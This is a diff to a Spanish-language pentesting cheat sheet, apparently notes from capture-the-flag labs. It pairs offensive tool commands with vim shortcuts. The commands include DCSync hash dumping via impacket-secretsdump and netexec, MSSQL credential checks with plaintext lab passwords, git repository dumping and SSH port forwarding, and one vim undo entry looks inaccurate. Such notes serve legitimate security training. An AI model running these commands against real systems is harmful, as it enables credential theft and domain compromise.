@@ -1286,7 +1286,7 @@ NOTA: Cuando el usuario comprometido forma parte del grupo Account operators tie
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "windows"
-Herramienta: "impacket-se"
+Herramienta: "secretsdump"
 Descripcion: DCSync attack
 Comando: impacket-secretsdump -just-dc-ntlm <dominio>/SrP3rr1n:Admin123.@10.129.95.210
 Configuracion manual del ataque:
@@ -1564,3 +1564,134 @@ Herramienta: "git_dumper"
 Descripcion: Dumpear un archivo .git para ver su contenido
 Comando: ./git_dumper.py http://dev.linkvortex.htb/ output
 NOTA: Esto es util cuando se encuentra un archivo .git en el servidor web
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "web"
+Protocolo: "HTTP"
+Herramienta: "dirsearch"
+Descripcion: Escaneo de directorios 
+Comando: dirsearch -u http://cypher.htb/ -x 404
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "nxc"
+Descripcion: Validar credeciales loclamente en MSSQL
+Comando: netexec mssql 192.168.210.15 -u zabbix -p 'rDhHbBEfh35sMbkY' --local-auth
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "nxc"
+Descripcion: Realizar DCSYnc desde nxc
+Comando: netexec -u user -p pass --ntds
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "SSH"
+Herramienta: "ssh"
+Descripcion: Local Port Forwarding
+Comando: ssh -L 8500:localhost:8500 ron@10.10.11.46
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "ss"
+Herramienta: "ss"
+Descripcion: Verificar los puertos activos abiertos internamente
+Comando: ss -tuln
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: emular accion CTRL + Z en vim
+Comando: En modo normal ALT + u
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir una linea abajo
+Comando: tecla j (jump)
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir una linea arriba
+Comando: tecla k
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir a la derecha
+Comando: tecla l
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir a la izquierda
+Comando: tecla h 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir al inicio de la linea
+Comando: tecla 0
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir al final de la linea
+Comando: tecla $
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Ir al siguiente inicio de una palabra
+Comando: tecla w
+NOTA: si quiero avanzar muchas palabras puedo poner 7w y avanzar hasta la 7 palabra o bien coloclar un numeor muy grande para ir hasta el final
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Eliminar una palabra completa
+Comando: tecla d + w
+NOTA: Tambien se puede especificar un numeo com 3 + d + w lo cual borrara 3 palabras
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Eliminar una linea completa
+Comando: tecla dd
+NOTA: Tambien se puede especificar un numeo com 3 + dd lo cual borrara 3 lineas
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Crea una nueva linea (pero entras al modo inserccion)
+Comando: tecla o
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Seleccionar texto en vim
+Comando: tecla v (entrar en modo visual) despues puedes moverte con las flechas hasta seleccionar todo lo que deseas y con y se copia y pegarlo con p
+NOTA: Tambien es posible poner la tecla d al texto seleccionado y si pones p se pega borrando la anterior
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Volver a hacer una accion previa en vim
+Comando: tecla .
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Entrar al modo buscador en vim 
+Comando: tecla /palabra_buscar
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Texto"
+Protocolo: ""
+Herramienta: "vim"
+Descripcion: Realizar una sustitucion con vim 
+Comando: :%s/palabra_rempalazar/remplazo/g 
+
+
+
+
+
+
+
